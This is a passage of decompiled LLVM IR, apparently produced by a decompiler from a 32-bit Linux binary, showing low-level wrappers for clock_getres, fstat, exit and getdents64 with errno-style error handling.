  store i32 %v7_8054e02, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8054e02, -4095
  br i1 %tmp14, label %dec_label_pc_8054e1a, label %dec_label_pc_8054e0e

dec_label_pc_8054e0e:                             ; preds = %dec_label_pc_8054de5
  %v1_8054e0e = call i32 @function_80530f9(i32 %v0_8054dfa)
  %v0_8054e13 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054e13 = sub i32 0, %v0_8054e13
  %v2_8054e15 = inttoptr i32 %v1_8054e0e to i32*
  store i32 %v1_8054e13, i32* %v2_8054e15, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8054e1d.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054e1a

dec_label_pc_8054e1a:                             ; preds = %dec_label_pc_8054de5, %dec_label_pc_8054e0e
  %v2_8054e1d = phi i32 [ %v0_8054de6, %dec_label_pc_8054de5 ], [ %v2_8054e1d.pre, %dec_label_pc_8054e0e ]
  %v0_8054e1a = phi i32 [ %v7_8054e02, %dec_label_pc_8054de5 ], [ -1, %dec_label_pc_8054e0e ]
  store i32 %v2_8054e1d, i32* @esi, align 4
  ret i32 %v0_8054e1a

; uselistorder directives
  uselistorder i32 %v7_8054e02, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054e1a, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8054e20(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8054e20:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8054e48(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054e48:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e48 = load i32, i32* @ebx, align 4
  store i32 %v0_8054e48, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8054e5b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8054e5b, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8054e5b, -4095
  br i1 %tmp10, label %dec_label_pc_8054e74, label %dec_label_pc_8054e68

dec_label_pc_8054e68:                             ; preds = %dec_label_pc_8054e48
  %v1_8054e68 = call i32 @function_80530f9(i32 %v0_8054e48)
  %v0_8054e6d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054e6d = sub i32 0, %v0_8054e6d
  %v2_8054e6f = inttoptr i32 %v1_8054e68 to i32*
  store i32 %v1_8054e6d, i32* %v2_8054e6f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054e78.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054e74

dec_label_pc_8054e74:                             ; preds = %dec_label_pc_8054e48, %dec_label_pc_8054e68
  %v2_8054e78 = phi i32 [ %v0_8054e48, %dec_label_pc_8054e48 ], [ %v2_8054e78.pre, %dec_label_pc_8054e68 ]
  %v0_8054e74 = phi i32 [ %v4_8054e5b, %dec_label_pc_8054e48 ], [ -1, %dec_label_pc_8054e68 ]
  %v2_8054e76 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054e76, i32* @edx, align 4
  store i32 %v2_8054e78, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054e74

; uselistorder directives
  uselistorder i32 %v4_8054e5b, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054e74, { 1, 0 }
}

define i32 @function_8054e7a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054e7a:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e7a = load i32, i32* @ebx, align 4
  store i32 %v0_8054e7a, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_8054e8d = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_8054e8d, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_8054e8d, -4095
  br i1 %tmp13, label %dec_label_pc_8054ea8, label %dec_label_pc_8054e9a

dec_label_pc_8054e9a:                             ; preds = %dec_label_pc_8054e7a
  %v1_8054e9a = call i32 @function_80530f9(i32 %v0_8054e7a)
  %v0_8054e9f = load i32, i32* @ebx, align 4
  %v1_8054e9f = sub i32 0, %v0_8054e9f
  %v2_8054ea1 = inttoptr i32 %v1_8054e9a to i32*
  store i32 %v1_8054e9f, i32* %v2_8054ea1, align 4
  %v2_8054ec0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054ebb

dec_label_pc_8054ea8:                             ; preds = %dec_label_pc_8054e7a
  %v1_8054ea8 = icmp eq i32 %v4_8054e8d, 0
  %v1_8054eaa = icmp eq i1 %v1_8054ea8, false
  br i1 %v1_8054eaa, label %dec_label_pc_8054ebb, label %dec_label_pc_8054eac

dec_label_pc_8054eac:                             ; preds = %dec_label_pc_8054ea8
  %v4_8054eb3 = bitcast i32* %stack_var_-68 to i16*
  %v5_8054eb3 = call i32 @function_80552c5(i16* %v4_8054eb3, i32 %arg2, i32 %v4_8054e8d, i32 %v4_8054e8d)
  %v0_8054ebb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054ebb

dec_label_pc_8054ebb:                             ; preds = %dec_label_pc_8054ea8, %dec_label_pc_8054e9a, %dec_label_pc_8054eac
  %v2_8054ec0 = phi i32 [ %v0_8054e7a, %dec_label_pc_8054ea8 ], [ %v2_8054ec0.pre, %dec_label_pc_8054e9a ], [ %v0_8054e7a, %dec_label_pc_8054eac ]
  %v0_8054ebb = phi i32 [ %v4_8054e8d, %dec_label_pc_8054ea8 ], [ -1, %dec_label_pc_8054e9a ], [ %v0_8054ebb.pre, %dec_label_pc_8054eac ]
  store i32 %v2_8054ec0, i32* @ebx, align 4
  ret i32 %v0_8054ebb

; uselistorder directives
  uselistorder i32 %v4_8054e8d, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8054ebb, { 2, 0, 1 }
}

define i32 @function_8054ec2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054ec2:
  %eax.global-to-local = alloca i32, align 4
  %v0_8054ec2 = load i32, i32* @edi, align 4
  %v0_8054ec3 = load i32, i32* @esi, align 4
  %v0_8054ec4 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8054ec9 = load i32, i32* @edx, align 4
  %v7_8054ed3 = inttoptr i32 %arg2 to i32*
  %v8_8054ed3 = call i32 @function_8054f31(i32 %arg1, i32* %v7_8054ed3, i32 %arg3, i32 %v0_8054ec9, i32 %v0_8054ec4, i32 %v0_8054ec3, i32 %v0_8054ec2)
  store i32 %v8_8054ed3, i32* %eax.global-to-local, align 4
  store i32 %v8_8054ed3, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_8054ed3, 1
  br i1 %tmp24, label %dec_label_pc_8054f2b, label %dec_label_pc_8054ee1

dec_label_pc_8054ee1:                             ; preds = %dec_label_pc_8054ec2
  %v0_8054ee1 = load i32, i32* @ebx, align 4
  %v2_8054ee1 = add i32 %v0_8054ee1, %v8_8054ed3
  store i32 %v2_8054ee1, i32* @edi, align 4
  %v7_8054f274 = icmp ult i32 %v0_8054ee1, %v2_8054ee1
  br i1 %v7_8054f274, label %dec_label_pc_8054ee6, label %dec_label_pc_8054f2b

dec_label_pc_8054ee6:                             ; preds = %dec_label_pc_8054ee1, %dec_label_pc_8054ee6
  %v0_8054ee6 = phi i32 [ %v2_8054f25, %dec_label_pc_8054ee6 ], [ %v0_8054ee1, %dec_label_pc_8054ee1 ]
  %v1_8054ee6 = add i32 %v0_8054ee6, 8
  %v2_8054ee6 = inttoptr i32 %v1_8054ee6 to i32*
  %v3_8054ee6 = load i32, i32* %v2_8054ee6, align 4
  store i32 %v3_8054ee6, i32* %eax.global-to-local, align 4
  %v2_8054ee9 = add i32 %v0_8054ee6, 4
  %v3_8054ee9 = inttoptr i32 %v2_8054ee9 to i32*
  store i32 %v3_8054ee6, i32* %v3_8054ee9, align 4
  %v0_8054eec = load i32, i32* @ebx, align 4
  %v1_8054eec = add i32 %v0_8054eec, 16
  %v2_8054eec = inttoptr i32 %v1_8054eec to i32*
  %v3_8054eec = load i32, i32* %v2_8054eec, align 4
  store i32 %v3_8054eec, i32* %eax.global-to-local, align 4
  %v1_8054eef = trunc i32 %v3_8054eec to i16
  %v3_8054eef = add i32 %v0_8054eec, 8
  %v4_8054eef = inttoptr i32 %v3_8054eef to i16*
  store i16 %v1_8054eef, i16* %v4_8054eef, align 2
  %v0_8054ef3 = load i32, i32* @ebx, align 4
  %v1_8054ef3 = add i32 %v0_8054ef3, 18
  %v2_8054ef3 = inttoptr i32 %v1_8054ef3 to i8*
  %v3_8054ef3 = load i8, i8* %v2_8054ef3, align 1
  %v4_8054ef3 = zext i8 %v3_8054ef3 to i32
  %v5_8054ef3 = load i32, i32* %eax.global-to-local, align 4
  %v6_8054ef3 = and i32 %v5_8054ef3, -256
  %v7_8054ef3 = or i32 %v6_8054ef3, %v4_8054ef3
  store i32 %v7_8054ef3, i32* %eax.global-to-local, align 4
  %v3_8054ef6 = add i32 %v0_8054ef3, 10
  %v4_8054ef6 = inttoptr i32 %v3_8054ef6 to i8*
  store i8 %v3_8054ef3, i8* %v4_8054ef6, align 1
  %v0_8054efa = load i32, i32* @ebx, align 4
  %v1_8054efa = add i32 %v0_8054efa, 8
  %v2_8054efa = inttoptr i32 %v1_8054efa to i16*
  %v3_8054efa = load i16, i16* %v2_8054efa, align 2
  %v4_8054efa = zext i16 %v3_8054efa to i32
  %v1_8054efe = add nsw i32 %v4_8054efa, -19
  %v1_8054f02 = add i32 %v0_8054efa, 19
  %v1_8054f06 = add i32 %v0_8054efa, 11
  store i32 %v1_8054f06, i32* %eax.global-to-local, align 4
  %v3_8054f0a = inttoptr i32 %v1_8054f06 to i8*
  %v4_8054f0a = call i32 @function_8053123(i8* %v3_8054f0a, i32 %v1_8054f02, i32 %v1_8054efe)
  store i32 %v4_8054f0a, i32* %eax.global-to-local, align 4
  %v0_8054f12 = load i32, i32* @ebx, align 4
  %v1_8054f12 = add i32 %v0_8054f12, 8
  %v2_8054f12 = inttoptr i32 %v1_8054f12 to i16*
  %v3_8054f12 = load i16, i16* %v2_8054f12, align 2
  %v4_8054f12 = zext i16 %v3_8054f12 to i32
  store i32 %v4_8054f12, i32* %eax.global-to-local, align 4
  %v3_8054f19 = inttoptr i32 %v0_8054f12 to i8*
  %v4_8054f19 = call i32 @function_8053123(i8* %v3_8054f19, i32 %v0_8054f12, i32 %v4_8054f12)
  store i32 %v4_8054f19, i32* %eax.global-to-local, align 4
  %v0_8054f1e = load i32, i32* @ebx, align 4
  %v1_8054f1e = add i32 %v0_8054f1e, 8
  %v2_8054f1e = inttoptr i32 %v1_8054f1e to i16*
  %v3_8054f1e = load i16, i16* %v2_8054f1e, align 2
  %v4_8054f1e = zext i16 %v3_8054f1e to i32
  store i32 %v4_8054f1e, i32* %eax.global-to-local, align 4
  %v2_8054f25 = add i32 %v4_8054f1e, %v0_8054f1e
  store i32 %v2_8054f25, i32* @ebx, align 4
  %v1_8054f27 = load i32, i32* @edi, align 4
  %v7_8054f27 = icmp ult i32 %v2_8054f25, %v1_8054f27
  br i1 %v7_8054f27, label %dec_label_pc_8054ee6, label %dec_label_pc_8054f27.dec_label_pc_8054f2b.loopexit_crit_edge

dec_label_pc_8054f27.dec_label_pc_8054f2b.loopexit_crit_edge: ; preds = %dec_label_pc_8054ee6
  %v0_8054f2b.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054f2b

dec_label_pc_8054f2b:                             ; preds = %dec_label_pc_8054ee1, %dec_label_pc_8054f27.dec_label_pc_8054f2b.loopexit_crit_edge, %dec_label_pc_8054ec2
  %v0_8054f2b = phi i32 [ %v8_8054ed3, %dec_label_pc_8054ec2 ], [ %v0_8054f2b.pre.pre, %dec_label_pc_8054f27.dec_label_pc_8054f2b.loopexit_crit_edge ], [ %v8_8054ed3, %dec_label_pc_8054ee1 ]
  store i32 %v0_8054f2b, i32* %eax.global-to-local, align 4
  store i32 %v0_8054ec3, i32* @esi, align 4
  store i32 %v0_8054ec2, i32* @edi, align 4
  ret i32 %v0_8054f2b

; uselistorder directives
  uselistorder i32 %v0_8054f2b, { 1, 0 }
  uselistorder i32 %v2_8054f25, { 1, 2, 0 }
  uselistorder i32 %v0_8054f12, { 1, 0, 2 }
  uselistorder i32 %v0_8054efa, { 1, 0, 2 }
  uselistorder i32 %v0_8054ee6, { 1, 0 }
  uselistorder i32 %v0_8054ee1, { 0, 2, 1 }
  uselistorder i32 %v8_8054ed3, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_8053123, { 6, 7, 1, 0, 2, 3, 4, 5, 8 }
  uselistorder i32 11, { 13, 11, 12, 18, 7, 4, 8, 5, 9, 6, 10, 0, 1, 14, 15, 16, 17, 2, 3, 19, 20 }
  uselistorder label %dec_label_pc_8054f2b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054ee6, { 1, 0 }
}

define i32 @function_8054f31(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8054f31:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8054f34 = load i32, i32* @edi, align 4
  %v0_8054f36 = load i32, i32* @ebx, align 4
  %v15_8054f37 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8054f40 = add i32 %arg3, 30
  store i32 %arg3, i32* @edx, align 4
  %v1_8054f46 = and i32 %v1_8054f40, -16
  %v2_8054f49 = sub i32 %v15_8054f37, %v1_8054f46
  %v1_8054f4b = add i32 %v2_8054f49, 15
  %v1_8054f4f = and i32 %v1_8054f4b, -16
  %v1_8054f55 = inttoptr i32 %v1_8054f4f to %linux_dirent64*
  store i32 %v1_8054f4f, i32* %ecx.global-to-local, align 4
  %v2_8054f57 = add i32 %v2_8054f49, -4
  %v3_8054f57 = inttoptr i32 %v2_8054f57 to i32*
  store i32 %v0_8054f36, i32* %v3_8054f57, align 4
  %v0_8054f58 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8054f5f = call i32 @getdents64(i32 %v0_8054f58, %linux_dirent64* %v1_8054f55, i32 %arg3)
  store i32 %v5_8054f5f, i32* %eax.global-to-local, align 4
  %v0_8054f61 = load i32, i32* @esp, align 4
  %v3_8054f61 = add i32 %v0_8054f61, 4
  %tmp41 = icmp ult i32 %v5_8054f5f, -4095
  br i1 %tmp41, label %dec_label_pc_8054f7b, label %dec_label_pc_8054f6c

dec_label_pc_8054f6c:                             ; preds = %dec_label_pc_8054f31
  %v1_8054f6c = call i32 @function_80530f9(i32 %v5_8054f5f)
  store i32 %v1_8054f6c, i32* %eax.global-to-local, align 4
  %v4_8054f71 = sub i32 0, %v5_8054f5f
  store i32 %v4_8054f71, i32* @edx, align 4
  %v2_8054f77 = inttoptr i32 %v1_8054f6c to i32*
  store i32 %v4_8054f71, i32* %v2_8054f77, align 4
  br label %dec_label_pc_805503d

dec_label_pc_8054f7b:                             ; preds = %dec_label_pc_8054f31
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_8054f4f, i32* @ebx, align 4
  %v5_805502d = add i32 %v5_8054f5f, %v1_8054f4f
  store i32 %v5_805502d, i32* %eax.global-to-local, align 4
  %v7_805503030 = icmp ult i32 %v1_8054f4f, %v5_805502d
  br i1 %v7_805503030, label %dec_label_pc_8054f9a.lr.ph, label %dec_label_pc_8055038

dec_label_pc_8054f9a.lr.ph:                       ; preds = %dec_label_pc_8054f7b
  %v5_8054fa7 = add i32 %tmp14, %arg3
  br label %dec_label_pc_8054f9a

dec_label_pc_8054f9a:                             ; preds = %dec_label_pc_8054f9a.lr.ph, %dec_label_pc_8054fdc
  %stack_var_-32.036 = phi i32 [ -1, %dec_label_pc_8054f9a.lr.ph ], [ %v3_8054fdf, %dec_label_pc_8054fdc ]
  %stack_var_-36.035 = phi i32 [ -1, %dec_label_pc_8054f9a.lr.ph ], [ %v3_8054fdc, %dec_label_pc_8054fdc ]
  %v0_8054fe834 = phi i32 [ %v1_8054f4f, %dec_label_pc_8054f9a.lr.ph ], [ %v2_8055025, %dec_label_pc_8054fdc ]
  %v1_8054fed33 = phi i32 [ %tmp14, %dec_label_pc_8054f9a.lr.ph ], [ %v2_8054faa, %dec_label_pc_8054fdc ]
  %v0_8054fb432 = phi i32 [ %v3_8054f61, %dec_label_pc_8054f9a.lr.ph ], [ %v1_8055027, %dec_label_pc_8054fdc ]
  %v1_8054f9a = add i32 %v0_8054fe834, 16
  %v2_8054f9a = inttoptr i32 %v1_8054f9a to i16*
  %v3_8054f9a = load i16, i16* %v2_8054f9a, align 2
  %v4_8054f9a = zext i16 %v3_8054f9a to i32
  %v1_8054f9e = add nuw nsw i32 %v4_8054f9a, 3
  %v1_8054fa4 = and i32 %v1_8054f9e, 131068
  store i32 %v1_8054fa4, i32* %ecx.global-to-local, align 4
  store i32 %v5_8054fa7, i32* %eax.global-to-local, align 4
  %v2_8054faa = add i32 %v1_8054fa4, %v1_8054fed33
  %tmp42 = icmp ugt i32 %v2_8054faa, %v5_8054fa7
  br i1 %tmp42, label %dec_label_pc_8054fb4, label %dec_label_pc_8054fdc

dec_label_pc_8054fb4:                             ; preds = %dec_label_pc_8054f9a
  %v1_8054fb4 = add i32 %v0_8054fb432, -4
  %v2_8054fb4 = inttoptr i32 %v1_8054fb4 to i32*
  store i32 0, i32* %v2_8054fb4, align 4
  %v5_8054fb6 = add i32 %v0_8054fb432, -8
  %v6_8054fb6 = inttoptr i32 %v5_8054fb6 to i32*
  store i32 %stack_var_-32.036, i32* %v6_8054fb6, align 4
  %v5_8054fb9 = add i32 %v0_8054fb432, -12
  %v6_8054fb9 = inttoptr i32 %v5_8054fb9 to i32*
  store i32 %stack_var_-36.035, i32* %v6_8054fb9, align 4
  %v5_8054fbc = add i32 %v0_8054fb432, -16
  %v6_8054fbc = inttoptr i32 %v5_8054fbc to i32*
  store i32 %arg1, i32* %v6_8054fbc, align 4
  %v1_8054fbf = call i32 @function_8055147(i32 %v2_8054faa)
  store i32 %v1_8054fbf, i32* %eax.global-to-local, align 4
  %v0_8054fc7 = load i32, i32* @esi, align 4
  %v15_8054fc7 = icmp eq i32 %v0_8054fc7, %tmp14
  %v1_8054fca = icmp eq i1 %v15_8054fc7, false
  br i1 %v1_8054fca, label %dec_label_pc_8055038, label %dec_label_pc_8054fcc

dec_label_pc_8054fcc:                             ; preds = %dec_label_pc_8054fb4
  %v1_8054fcc = call i32 @function_80530f9(i32 %v2_8054faa)
  store i32 %v1_8054fcc, i32* %eax.global-to-local, align 4
  %v1_8054fd1 = inttoptr i32 %v1_8054fcc to i32*
  store i32 22, i32* %v1_8054fd1, align 4
  br label %dec_label_pc_805503d

dec_label_pc_8054fdc:                             ; preds = %dec_label_pc_8054f9a
  %v1_8054fdc = add i32 %v0_8054fe834, 8
  %v2_8054fdc = inttoptr i32 %v1_8054fdc to i32*
  %v3_8054fdc = load i32, i32* %v2_8054fdc, align 4
  store i32 %v3_8054fdc, i32* %eax.global-to-local, align 4
  %v1_8054fdf = add i32 %v0_8054fe834, 12
  %v2_8054fdf = inttoptr i32 %v1_8054fdf to i32*
  %v3_8054fdf = load i32, i32* %v2_8054fdf, align 4
  %v1_8054fe8 = inttoptr i32 %v0_8054fe834 to i32*
  %v2_8054fe8 = load i32, i32* %v1_8054fe8, align 4
  store i32 %v2_8054fe8, i32* %eax.global-to-local, align 4
  %v1_8054fea = add i32 %v0_8054fe834, 4
  %v2_8054fea = inttoptr i32 %v1_8054fea to i32*
  %v3_8054fea = load i32, i32* %v2_8054fea, align 4
  %v2_8054fed = add i32 %v1_8054fed33, 4
  %v3_8054fed = inttoptr i32 %v2_8054fed to i32*
  store i32 %v3_8054fea, i32* %v3_8054fed, align 4
  %v0_8054ff0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054ff0 = load i32, i32* @esi, align 4
  %v2_8054ff0 = inttoptr i32 %v1_8054ff0 to i32*
  store i32 %v0_8054ff0, i32* %v2_8054ff0, align 4
  %v0_8054ff2 = load i32, i32* @ebx, align 4
  %v1_8054ff2 = add i32 %v0_8054ff2, 8
  %v2_8054ff2 = inttoptr i32 %v1_8054ff2 to i32*
  %v3_8054ff2 = load i32, i32* %v2_8054ff2, align 4
  store i32 %v3_8054ff2, i32* %eax.global-to-local, align 4
  %v1_8054ff5 = add i32 %v0_8054ff2, 12
  %v2_8054ff5 = inttoptr i32 %v1_8054ff5 to i32*
  %v3_8054ff5 = load i32, i32* %v2_8054ff5, align 4
  store i32 %v3_8054ff5, i32* @edx, align 4
  %v1_8054ff8 = load i32, i32* @esi, align 4
  %v2_8054ff8 = add i32 %v1_8054ff8, 12
  %v3_8054ff8 = inttoptr i32 %v2_8054ff8 to i32*
  store i32 %v3_8054ff5, i32* %v3_8054ff8, align 4
  %v0_8054ffb = load i32, i32* %eax.global-to-local, align 4
  %v1_8054ffb = load i32, i32* @esi, align 4
  %v2_8054ffb = add i32 %v1_8054ffb, 8
  %v3_8054ffb = inttoptr i32 %v2_8054ffb to i32*
  store i32 %v0_8054ffb, i32* %v3_8054ffb, align 4
  %v0_8054ffe = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054ffe = trunc i32 %v0_8054ffe to i16
  %v2_8054ffe = load i32, i32* @esi, align 4
  %v3_8054ffe = add i32 %v2_8054ffe, 16
  %v4_8054ffe = inttoptr i32 %v3_8054ffe to i16*
  store i16 %v1_8054ffe, i16* %v4_8054ffe, align 2
  %v0_8055002 = load i32, i32* @ebx, align 4
  %v1_8055002 = add i32 %v0_8055002, 18
  %v2_8055002 = inttoptr i32 %v1_8055002 to i8*
  %v3_8055002 = load i8, i8* %v2_8055002, align 1
  %v4_8055002 = zext i8 %v3_8055002 to i32
  %v5_8055002 = load i32, i32* %eax.global-to-local, align 4
  %v6_8055002 = and i32 %v5_8055002, -256
  %v7_8055002 = or i32 %v6_8055002, %v4_8055002
  store i32 %v7_8055002, i32* %eax.global-to-local, align 4
  %v2_8055005 = load i32, i32* @esi, align 4
  %v3_8055005 = add i32 %v2_8055005, 18
  %v4_8055005 = inttoptr i32 %v3_8055005 to i8*
  store i8 %v3_8055002, i8* %v4_8055005, align 1
  %v0_8055008 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055008 = load i32, i32* @esp, align 4
  %v2_8055008 = add i32 %v1_8055008, -4
  %v3_8055008 = inttoptr i32 %v2_8055008 to i32*
  store i32 %v0_8055008, i32* %v3_8055008, align 4
  %v0_8055009 = load i32, i32* @ebx, align 4
  %v1_8055009 = add i32 %v0_8055009, 16
  %v2_8055009 = inttoptr i32 %v1_8055009 to i16*
  %v3_8055009 = load i16, i16* %v2_8055009, align 2
  %v4_8055009 = zext i16 %v3_8055009 to i32
  %v1_805500d = add nsw i32 %v4_8055009, -19
  %v2_8055010 = add i32 %v1_8055008, -8
  %v3_8055010 = inttoptr i32 %v2_8055010 to i32*
  store i32 %v1_805500d, i32* %v3_8055010, align 4
  %v0_8055011 = load i32, i32* @ebx, align 4
  %v1_8055011 = add i32 %v0_8055011, 19
  %v2_8055014 = add i32 %v1_8055008, -12
  %v3_8055014 = inttoptr i32 %v2_8055014 to i32*
  store i32 %v1_8055011, i32* %v3_8055014, align 4
  %v0_8055015 = load i32, i32* @esi, align 4
  %v1_8055015 = add i32 %v0_8055015, 19
  store i32 %v1_8055015, i32* %eax.global-to-local, align 4
  %v2_8055018 = add i32 %v1_8055008, -16
  %v3_8055018 = inttoptr i32 %v2_8055018 to i32*
  store i32 %v1_8055015, i32* %v3_8055018, align 4
  %v3_8055019 = inttoptr i32 %v2_8054faa to i16*
  %v4_8055019 = call i32 @function_8055342(i16* %v3_8055019, i32 %v3_8054fdc, i32 %v3_8054fdf)
  store i32 %v4_8055019, i32* %eax.global-to-local, align 4
  %v0_805501e = load i32, i32* @ebx, align 4
  %v1_805501e = add i32 %v0_805501e, 16
  %v2_805501e = inttoptr i32 %v1_805501e to i16*
  %v3_805501e = load i16, i16* %v2_805501e, align 2
  %v4_805501e = zext i16 %v3_805501e to i32
  store i32 %v2_8054faa, i32* @esi, align 4
  %v2_8055025 = add i32 %v4_805501e, %v0_805501e
  store i32 %v2_8055025, i32* @ebx, align 4
  %v0_8055027 = load i32, i32* @esp, align 4
  %v1_8055027 = add i32 %v0_8055027, 16
  store i32 %v5_805502d, i32* %eax.global-to-local, align 4
  %v7_8055030 = icmp ult i32 %v2_8055025, %v5_805502d
  br i1 %v7_8055030, label %dec_label_pc_8054f9a, label %dec_label_pc_8055038

dec_label_pc_8055038:                             ; preds = %dec_label_pc_8054f7b, %dec_label_pc_8054fdc, %dec_label_pc_8054fb4
  %v0_8055038 = phi i32 [ %v0_8054fc7, %dec_label_pc_8054fb4 ], [ %tmp14, %dec_label_pc_8054f7b ], [ %v2_8054faa, %dec_label_pc_8054fdc ]
  store i32 %v0_8055038, i32* %eax.global-to-local, align 4
  %v5_805503a = sub i32 %v0_8055038, %tmp14
  br label %dec_label_pc_805503d

dec_label_pc_805503d:                             ; preds = %dec_label_pc_8054fcc, %dec_label_pc_8054f6c, %dec_label_pc_8055038
  %storemerge = phi i32 [ %v5_805503a, %dec_label_pc_8055038 ], [ -1, %dec_label_pc_8054f6c ], [ -1, %dec_label_pc_8054fcc ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8054f36, i32* @ebx, align 4
  store i32 %v0_8054f34, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8055038, { 1, 0 }
  uselistorder i32 %v2_8055025, { 0, 2, 1 }
  uselistorder i32 %v3_8054fdf, { 1, 0 }
  uselistorder i32 %v3_8054fdc, { 1, 2, 0 }
  uselistorder i32 %v2_8054faa, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_8054fb432, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8054fe834, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_805502d, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8054f5f, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 17, 2, 16, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 18, 0, 19 }
  uselistorder i32 (i16*, i32, i32)* @function_8055342, { 5, 2, 3, 4, 0, 1 }
  uselistorder i32 19, { 8, 9, 10, 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32 18, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i32 22, { 13, 14, 5, 6, 7, 15, 3, 4, 8, 9, 10, 11, 12, 0, 1, 2 }
  uselistorder i32 -12, { 17, 37, 93, 94, 21, 22, 50, 51, 52, 53, 39, 18, 45, 48, 49, 46, 43, 20, 41, 19, 38, 47, 23, 54, 55, 44, 42, 40, 24, 56, 57, 25, 26, 58, 59, 60, 61, 62, 36, 27, 32, 29, 28, 66, 67, 0, 68, 1, 2, 86, 81, 82, 83, 33, 34, 80, 35, 84, 85, 69, 3, 4, 30, 31, 5, 70, 71, 6, 7, 72, 8, 73, 9, 10, 74, 11, 75, 12, 13, 76, 14, 77, 15, 78, 79, 63, 64, 65, 87, 88, 89, 90, 91, 16, 92 }
  uselistorder i32 -8, { 0, 8, 80, 76, 78, 77, 79, 81, 82, 22, 23, 24, 25, 26, 27, 10, 11, 17, 20, 21, 18, 15, 2, 13, 1, 9, 19, 28, 29, 30, 16, 14, 12, 3, 31, 32, 4, 33, 34, 35, 36, 37, 38, 73, 5, 58, 45, 6, 42, 43, 44, 68, 62, 63, 64, 59, 60, 61, 65, 66, 67, 46, 47, 7, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 39, 40, 41, 69, 70, 71, 72, 74, 75 }
  uselistorder i32* @esp, { 193, 194, 195, 6, 7, 8, 9, 10, 331, 332, 0, 53, 54, 55, 56, 57, 58, 59, 60, 13, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 11, 123, 15, 125, 126, 127, 106, 107, 128, 129, 130, 131, 132, 94, 95, 96, 97, 98, 43, 44, 45, 46, 47, 89, 90, 91, 92, 93, 99, 100, 102, 103, 134, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 48, 49, 50, 51, 52, 133, 78, 79, 80, 81, 82, 83, 84, 77, 85, 86, 87, 88, 101, 104, 105, 120, 121, 122, 135, 136, 137, 14, 163, 162, 138, 139, 140, 141, 142, 143, 124, 144, 145, 146, 147, 148, 149, 158, 159, 160, 150, 151, 152, 153, 154, 155, 156, 157, 12, 161, 1, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 2, 3, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 196, 197, 198, 199, 200, 201, 202, 203, 204, 